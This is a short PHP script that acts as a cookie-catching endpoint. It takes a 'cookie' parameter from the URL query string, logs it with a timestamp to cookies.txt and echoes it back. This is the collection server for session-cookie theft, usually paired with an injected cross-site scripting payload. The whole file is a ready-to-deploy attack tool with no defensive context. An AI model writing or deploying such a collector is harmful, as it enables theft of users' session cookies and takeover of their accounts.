<?php
date_default_timezone_set("Asia/Jakarta");
if (isset($_GET['cookie']) && $_GET['cookie'] !== '') {
    $cookie = $_GET['cookie'];
    $time = date("Y-m-d H:i:s");
    file_put_contents(__DIR__ . "/cookies.txt", "[{$time}] COOKIE RECEIVED: " . $cookie . "\n", FILE_APPEND);
    echo "Cookie received at $time: $cookie";
} else {
    echo "No cookie received.";
}
?>
